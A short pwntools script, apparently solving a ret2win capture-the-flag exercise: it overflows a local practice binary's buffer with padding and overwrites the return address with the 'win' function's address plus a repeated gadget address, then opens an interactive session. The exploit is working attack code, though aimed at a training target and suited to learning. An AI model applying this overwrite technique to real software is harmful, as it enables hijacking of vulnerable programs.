#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
TARGET = './ret2win_64'

# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = [
    'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
]

elf = ELF(TARGET)

p = process(TARGET)

gdb_script = f"""
    break *main
    continue
"""
# gdb.attach(p, gdbscript=gdb_script)
gdb.debug(TARGET, gdbscript=gdb_script)

# ===================================== #

win = elf.symbols['win']

payload = b'A' * 32 + b'B' * 8 + p64(win+1) + p64(0x4012f4) * 2
p.sendline(payload)

p.interactive()
